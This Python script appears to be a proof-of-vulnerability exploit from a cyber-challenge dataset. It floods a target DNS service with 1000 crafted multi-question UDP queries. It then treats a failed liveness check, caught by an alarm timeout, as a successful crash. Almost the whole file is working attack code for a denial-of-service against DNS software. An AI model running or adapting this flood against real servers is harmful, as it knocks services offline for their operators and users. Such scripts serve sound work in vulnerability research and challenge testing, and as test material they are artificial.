import sys
from pwn import *

def handler( signum, frame):
    print('[SUCCESs] sigalrm fired so the POV was likely successful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

## Host IP or domain name
## Host Port
## List of queries
def send_txt_query(HOST, PORT, qname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    id = random.randint(0, 2**16 - 1)

    header = struct.pack('>H', id)

    ## query (0)
    ## no recursion
    header += struct.pack('>H', 0)

    header += struct.pack('>H', len(qname))
    header += struct.pack('>H', 0)
    header += struct.pack('>H', 0)
    header += struct.pack('>H', 0)

    data = b''

    for q in qname:
        d = q[0].split(b'.')

        for i in d:
            data += struct.pack('B', len(i))
            data += i

        data += b'\x00'

        ## type
        data += struct.pack('>H', q[1])

        ## Class
        data += struct.pack('>H', q[2])

    final = header + data
    s.sendto(header + data, (HOST, PORT))

def docheck(HOST, PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    id = random.randint(0, 2**16 - 1)

    header = struct.pack('>H', id)

    ## query (0)
    ## no recursion
    header += struct.pack('>H', 0)

    header += struct.pack('>H', 1)
    header += struct.pack('>H', 0)
    header += struct.pack('>H', 0)
    header += struct.pack('>H', 0)

    data = b''

    q = b'darpachess.com'

    d = q.split(b'.')

    for i in d:
        data += struct.pack('B', len(i))
        data += i

    data += b'\x00'

    ## type
    data += struct.pack('>H', 16)

    ## Class
    data += struct.pack('>H', 1)

    final = header + data
    s.sendto(header + data, (HOST, PORT))

    msg,cl = s.recvfrom(1024)

    return msg

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    q = [(b'darpachess.com', 16,1), (b'darpachess.org', 1,1)]

    dnsip = socket.gethostbyname(HOST)

    for i in range(1000):
        send_txt_query(dnsip,PORT,q)

    print('[INFO] Doing the liveness check....')
    docheck(dnsip, PORT)

    print('[FAIL] POV Failed')

if __name__ == '__main__':
    main()
